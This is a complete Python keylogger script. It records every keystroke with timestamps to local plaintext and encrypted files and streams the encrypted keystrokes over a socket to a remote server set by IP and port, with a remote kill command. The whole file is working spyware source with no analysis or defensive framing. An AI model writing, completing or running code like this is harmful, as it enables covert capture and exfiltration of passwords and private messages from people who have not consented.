from pynput import keyboard
import socket
from cryptography.fernet import Fernet
import os
import datetime
import threading

# Shared key from key.py
KEY = b'TuAjBP-3G4Br9vpwzpFTn-W1uS4l32YT-YyWSOGtJXg='  # Replace this with your key
fernet = Fernet(KEY)

SERVER_IP = '192.168.1.xxx' # Replace this with target's IP address
PORT = 9999 # Replace this with your port number

log_file = "local_keylog.txt" # This will store plaintext logs locally

# Global flag to control keylogger running state
running = True

# Set up connection
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    client.connect((SERVER_IP, PORT))
except Exception as e:
    print(f"[!] Could not connect to server: {e}")
    client = None  # Still logs locally if network fails

def listen_for_kill():
    global running
    if not client:
        return
    while running:
        try:
            # Wait for a message from the receiver (blocking, but in a thread)
            msg = client.recv(1024)
            if msg:
                try:
                    # Try to decrypt the message
                    command = fernet.decrypt(msg).decode()
                except Exception:
                    command = msg.decode(errors='ignore')
                if command.strip() == 'KILL':
                    print("[!] Remote kill command received. Stopping keylogger.")
                    running = False
                    break
        except Exception as e:
            break

kill_combo = {keyboard.Key.ctrl_l, keyboard.Key.shift_l, keyboard.KeyCode(char='q')}
current_keys = set()

def on_press(key):
    global running
    if not running:
        return False
    time_stamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        content = f"{time_stamp} - {key.char}\n"
    except AttributeError:
        content = f"{time_stamp} - [{key}]\n"

    # Log plaintext locally
    with open(log_file, "a") as f:
        f.write(content)

    # Encrypt the content
    encrypted = fernet.encrypt(content.encode())

    # Log encrypted locally (as base64 to keep it text-friendly)
    with open("local_encrypted_keylog.txt", "ab") as ef:
        ef.write(encrypted + b"\n")

    # Send encrypted to server
    if client:
        try:
            client.send(encrypted)
        except Exception as e:
            print(f"[!] Sending error: {e}")
# To allow only the receiver to kill the connection (remote kill switch), comment out the following local kill switch block:
    # current_keys.add(key)
    # if kill_combo <= current_keys:
    #     print("[*] Kill switch activated.")
    #     if client:
    #         client.close()
    #     return False  # Stops the keylogger
# And uncomment the above block to allow local kill switch:

def on_release(key):
    global running
    if not running:
        return False
    if key in current_keys:
        current_keys.remove(key)
    if key == keyboard.Key.esc:
        if client:
            client.close()
        running = False
        return False

# Start the remote kill listener thread
if client:
    threading.Thread(target=listen_for_kill, daemon=True).start()

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
